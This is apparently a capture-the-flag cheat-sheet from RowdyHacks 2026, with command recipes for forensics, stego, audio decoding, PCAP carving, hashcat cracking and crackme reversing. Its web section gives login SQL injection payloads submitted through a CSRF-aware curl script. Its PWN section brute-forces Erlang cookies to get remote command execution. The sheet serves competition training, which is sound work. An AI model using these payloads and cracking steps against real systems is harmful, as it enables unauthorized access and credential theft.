# CTF Cheat-Sheet — greppable command recipes

Built from RowdyHacks 2026. Organized by category. `Ctrl-F` for the situation
you're in. Tools in parens are the fast path.

---

## FIRST MOVE — always
```bash
./triage.sh <file>          # file type, size-vs-footer, strings, exiftool, binwalk, entropy
```
Trust `file`, not the extension. Compare size to where content ends (JPEG `FF D9`,
PNG `IEND`) — extra bytes = appended archive/data.

## FORENSICS / STEGO
```bash
file f; stat -c%s f
exiftool f                                   # comments / base64 in fields
strings -n6 f | grep -aiE 'flag|rowdy|\{'    # also: strings -e l (UTF-16)
binwalk f;  binwalk -e f;  unzip f           # appended ZIP reads from the end
zsteg -a f.png                               # LSB stego (PNG/BMP)
steghide extract -sf f.jpg -p PASS -xf out   # JPEG + known passphrase
stegseek f.jpg /usr/share/wordlists/rockyou.txt   # JPEG, brute passphrase
```
LSB-by-hand (PNG):
```python
from PIL import Image; import numpy as np
b=np.array(Image.open("f.png").convert("RGB")).reshape(-1)&1
print(np.packbits(b).tobytes()[:80])
```

## AUDIO / RF
```bash
python3 audio_id.py f.wav         # tells you PSK (fldigi) vs FSK (minimodem) vs SSTV
```
- ONE constant carrier  -> PSK  -> **fldigi** BPSK31 (then RTTY, MFSK16)
- TWO shifting tones     -> FSK  -> **minimodem** `--rx -f f.wav 1200` (sweep 300/1200/rtty)
- warbling image         -> SSTV -> **qsstv** (or phone Robot36 app)
- painted text           -> spectrogram in **Sonic Visualiser / Audacity**
WSL has no audio — run fldigi/qsstv on **Windows**, feed the WAV via File->Audio->RX capture.

## PCAP
```bash
tshark -r f.pcap -q -z io,phs                       # protocol survey
tshark -r f.pcap --export-objects http,out/         # carve files over HTTP
tshark -r f.pcap -Y 'dns.flags.response==1' -T fields -e dns.txt   # DNS TXT exfil
```
Reassemble multi-segment payloads in TCP-seq order; decode compressed content
(`grep` on raw pcap misses it). "piece N of M" -> collect across protocols, order
by sequence number.

## ARCHIVE / PASSWORD CRACKING
```bash
./crackprep.sh <file>            # *2john -> clean 1-line hash + exact hashcat cmd
# modes: 7z=11600  zip=13600/17200  rar=13000  pdf=10500  office=9600
hashcat -m 11600 -a 0 h.hash wordlist.txt -r rules.rule
hashcat -m 11600 -a 6 h.hash words.txt '?d?s'        # dict + 1 digit + 1 symbol
hashcat -m 11600 h.hash --show
```
Rule for "capitalize + one leet letter": lines like `c`, `c sa4`, `c se3`, `c so0`…
Preview a rule file: `hashcat --stdout words.txt -r r.rule | sort -u > base.lst`.
**Cost 2^19 KDF (7z/office) = GPU only.** Free GPU: Colab / Kaggle T4.
Hash hygiene: one line, starts with `$tag$`, no appended junk, filename with `!`
needs single quotes.

## REVERSING (crackme)
```bash
file bin; strings -n4 bin                     # prompts, decoys, flag format
objdump -d -M intel bin > dis.asm             # find the routine that gates "success"
objdump -s -j .rodata bin                     # dump constant tables with addresses
```
Read the length check, then the per-byte transform. If it's invertible
(`+k*i`, `^c`), compute the input — don't brute:
```python
# example: ((inp[i] + 3*i) ^ 0x5a) == table[i]
inp = bytes(((t[i]^0x5a)-3*i)&0xff for i in range(len(t)))
```

## WEB
```bash
curl -s -i URL                                        # status codes tell you what exists
curl -s URL | grep -oE 'csrf_token" value="[^"]+"'    # grab CSRF, reuse jar
# SQLi-through-CSRF (cookie jar keeps session+token paired):
TOKEN=$(curl -s -c jar.txt URL/login | grep -oE 'csrf_token" value="[^"]+"' | sed -E 's/.*value="([^"]+)".*/\1/')
curl -s -i -b jar.txt -c jar.txt URL/login \
  --data-urlencode "csrf_token=$TOKEN" \
  --data-urlencode "username=admin'--" --data-urlencode "password=x"
```
Login SQLi staples: `' OR '1'='1`  `admin'--`  `user'--`  `')--`. Canary: lone `'`
that changes the error/500 = injection. Flask session = `payload.ts.sig` ->
`flask-unsign --unsign/--wordlist`. If a good payload returns a generic error,
suspect a **layer in front** (CSRF/content-type/WAF) before changing it.

## PWN — exposed Erlang node (BEAM)
Scripts (`erl_pwn.py`, `rowdy_tunnel.py`) live in the rowdyhacks-2026-writeup repo.
```bash
python3 rowdy_tunnel.py           # TCP<->WSS bridge (if provided)
python3 erl_pwn.py --recon        # confirm dist node, leak node name (cookie-free)
python3 erl_pwn.py --brute        # try common magic cookies
python3 erl_pwn.py -c COOKIE "id; cat /flag*"   # RCE via rpc -> os:cmd
```
Exposed Erlang distribution port + known cookie = RCE by design. Find the cookie
in app source (`RELEASE_COOKIE`, `vm.args`) or brute.

## META
- Decoys are a mechanic: fake flags, retired passwords, crackable-but-unused
  secrets. Cracking a dead end still eliminates a path.
- Read status codes + exact error text, not just a keyword grep.
- Right payload, wrong layer -> fix the plumbing before changing the payload.
- Clues hide in names/extensions ("Rock Me"->rockyou, `.h/.c`->elements, "Beam"->BEAM VM).
- Know when to offload: GPU crack -> cloud; GUI audio -> native Windows.
